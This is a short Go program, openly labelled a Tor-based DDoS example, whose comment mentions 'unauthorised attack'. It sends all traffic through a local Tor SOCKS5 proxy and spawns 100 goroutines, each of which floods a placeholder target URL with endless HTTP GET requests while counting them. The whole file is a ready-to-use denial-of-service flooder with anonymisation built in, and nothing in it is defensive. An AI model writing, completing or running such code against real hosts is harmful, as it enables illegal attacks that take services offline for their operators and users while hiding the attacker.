//DDOS EXAMPLE USING TOR
// Please ensure to install the tor before any unauthorised attack
package main

import (
	"fmt"
	"net/http"
	"net/url"
	"sync/atomic"
	"time"

	"golang.org/x/net/proxy"
)

var req uint64

func main() {
	urlpse, _ := url.Parse("socks5://127.0.0.1:9050")
	wayer, _ := proxy.FromURL(urlpse, proxy.Direct)
	nwpath := &http.Transport{Dial: wayer.Dial}
	client := &http.Client{Transport: nwpath}
	//creating goroutines
	for i := 1; i <= 100; i++ {
		go func() {
			for {
				resp, _ := client.Get("http url here with port no")
				resp.Body.Close()
				atomic.AddUint64(&req, 1)
				fmt.Println(req)
			}
		}()
		time.Sleep(1 * time.Second)
	}
}
